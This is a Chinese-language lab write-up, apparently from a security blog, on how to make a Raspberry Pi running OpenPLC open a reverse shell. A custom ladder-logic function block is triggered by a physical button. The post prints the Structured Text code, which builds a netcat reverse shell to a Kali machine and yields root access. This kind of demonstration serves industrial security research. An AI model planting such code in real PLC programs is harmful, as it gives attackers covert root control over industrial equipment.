> 原文链接: https://www.anquanke.com//post/id/236177 


# 用梯形图反弹一个PLC的shell


                                阅读量   
                                **212670**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t019ec0be67f53f2ec3.jpg)](https://p2.ssl.qhimg.com/t019ec0be67f53f2ec3.jpg)



这次实验的目标是通过梯形图的编程，对外反弹一个PLC底层OS的shell连接外部Kali机器（也可以是VPS上Kali），而这次采用外部面包板上按钮来做触发。这次PLC仍然采用树莓派上运行OpenPLC来制作。



## 1、建立实验环境

这次已经准备好以下几项设备：

树莓派（硬件PLC 运行OpenPLC Runtime），IP：192.168.3.14

Window7虚拟机（运行OpenPLC编辑环境）， IP：192.168.3.3

Kali攻击机（渗透测试），IP：192.168.3.10

外围电路：面包板，LED灯，按钮和电线



## 2、编写一个梯形图和封装一个功能块

首先，我们打开OpenPLC编辑器，新建一个项目后，添加一个自定义功能块：

[![](https://p2.ssl.qhimg.com/t01b3d2ac2685d9d7cf.png)](https://p2.ssl.qhimg.com/t01b3d2ac2685d9d7cf.png)

输入一个功能块的名字，这里为了明显，名字选择rsh_exec，同时编程语言选择ST（结构化语言“类似于Pascal”）

[![](https://p1.ssl.qhimg.com/t01fcbdc4e60288347e.png)](https://p1.ssl.qhimg.com/t01fcbdc4e60288347e.png)

定义了功能块的输入和输出，同时写入一段反弹shell的ST的程序段

[![](https://p5.ssl.qhimg.com/t010a2f5fbc41e1fb4a.png)](https://p5.ssl.qhimg.com/t010a2f5fbc41e1fb4a.png)

在ST编辑环境中输入以下这段程序：

IF (exe = TRUE) THEN

`{`system(“mknod /tmp/pipe p”);`}`

`{`system(“/bin/sh 0&lt;/tmp/pipe | nc 192.168.3.10 4444 1&gt;/tmp/pipe”);`}`

done := TRUE;

return;

END_IF;

done := FALSE;

return;



## 3、在用户逻辑中调用这个功能块：

[![](https://p3.ssl.qhimg.com/t0167720e89b4077224.png)](https://p3.ssl.qhimg.com/t0167720e89b4077224.png)

测试后，运行树莓派上OpenPLC的这段成程序，按下按钮后会反弹一个树莓派 Pi OS的shell给外部Kali机器，同时会显示ID和hostname，并且是root权限。

[![](https://p4.ssl.qhimg.com/t01381c44e86455c556.png)](https://p4.ssl.qhimg.com/t01381c44e86455c556.png)

注释：不是全部PLC都支持这种OS层的shell反弹，但是可以通过梯形图的组态，制作成基于所有PLC的自定义的功能码的shell反弹程序，如果有工控用户shell反弹防护技术和方法感兴趣可以联系工业安全红队IRTeam。
